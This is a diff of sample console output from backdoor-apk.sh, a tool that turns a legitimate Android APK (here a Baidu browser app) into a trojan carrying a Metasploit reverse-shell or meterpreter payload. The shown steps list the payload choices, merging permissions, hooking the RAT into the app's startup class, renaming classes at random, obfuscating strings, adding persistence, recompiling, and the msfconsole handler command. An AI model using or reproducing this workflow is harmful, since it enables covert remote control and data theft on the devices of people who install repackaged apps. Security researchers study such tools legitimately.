@@ -19,7 +19,7 @@ ________|__________|__________________________________________
        /____________\
        |____________|            Dana James Traversie
 
-[*] Running backdoor-apk.sh v0.2.3 on Mon Oct  9 16:50:06 EDT 2017
+[*] Running backdoor-apk.sh v0.2.4 on Thu Sep 27 17:13:34 EDT 2018
 [+] Android payload options:
 1) meterpreter/reverse_http   4) shell/reverse_http
 2) meterpreter/reverse_https  5) shell/reverse_https
@@ -30,18 +30,27 @@ ________|__________|__________________________________________
 [+] Android manifest permission options:
 1) Keep original
 2) Merge with payload and shuffle
-[?] Please select an Android manifest permission option: 1
+[?] Please select an Android manifest permission option: 2
 [+] Handle the payload via resource script: msfconsole -r backdoor-apk.rc
-[*] Generating RAT APK file...done.
 [*] Decompiling original APK file...done.
-[+] Keeping permissions of original project
-[*] Running proguard on RAT APK file...done.
-[*] Decompiling obfuscated RAT APK file...done.
-[*] Creating new directories in original project for RAT smali files...done.
+[*] Locating smali file to hook in original project...done.
+[+] Package where RAT smali files will be injected: com/baidu/browser/inter
+[+] Smali file to hook RAT payload: com/baidu/browser/inter/BdApplication.smali
+[*] Generating RAT APK file...done.
+[*] Decompiling RAT APK file...done.
+[*] Merging permissions of original and payload projects...done.
+[*] Injecting helpful Java classes in RAT APK file...done.
+[*] Creating new directory in original package for RAT smali files...done.
+[+] Inject package path: com/baidu/browser/inter/pjese
+[+] Generated new smali class name for MainBroadcastReceiver.smali: Iivym
+[+] Generated new smali class name for MainService.smali: Aupyx
+[+] Generated new smali class name for Payload.smali: Nwiuc
+[+] Generated new smali class name for StringObfuscator.smali: Abnrw
+[+] Generated new smali method name for StringObfuscator.obfuscate method: icobf
+[+] Generated new smali method name for StringObfuscator.unobfuscate method: wbcik
 [*] Copying RAT smali files to new directories in original project...done.
 [*] Fixing RAT smali files...done.
 [*] Obfuscating const-string values in RAT smali files...done.
-[*] Locating smali file to hook in original project...done.
 [*] Adding hook in original smali file...done.
 [*] Adding persistence hook in original project...done.
 [*] Recompiling original project with backdoor...done.
